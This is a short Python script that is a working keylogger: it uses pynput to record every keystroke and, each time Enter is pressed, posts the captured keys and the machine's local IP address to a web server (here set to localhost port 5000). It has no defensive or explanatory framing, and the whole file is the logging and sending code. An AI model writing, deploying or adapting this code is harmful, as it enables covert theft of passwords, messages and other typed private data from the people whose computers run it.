from pynput.keyboard import Listener, Key
import socket
import requests

server_url = "http://127.0.0.1:5000//get_logs"
serever_url_2 = "http://127.0.0.1:5000//get_IP"
logs = ''
ip = ''


# def login(key):
#     global ip

#     # socket.getsockname()
#     # s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
#     # s.connect(("8.8.8.8", 80))
#     while True:
#         if key == Key.enter:
            
#             requests.post(serever_url_2, data={'ip': ip})
#             ip = ''
#         else:
#             s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
#             s.connect(("8.8.8.8", 80))
#             ip += str(s.getsockname()[0]).replace("'", "")
            


def on_press(key):
    global logs
    global ip
    

    # print(s.getsockname()[0])


    if key == Key.enter:
        requests.post(server_url, data={'logs': logs})
        requests.post(serever_url_2, data={'ip': ip})
        # ip = ''
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = str(s.getsockname()[0]).replace("'", "")
        # ip = ''
        logs = ''
    else:
        # ip = ''
       
        logs += str(key).replace("'","")
    # print(key)
    

with Listener(on_press=on_press) as listener:
    listener.join()

# dd
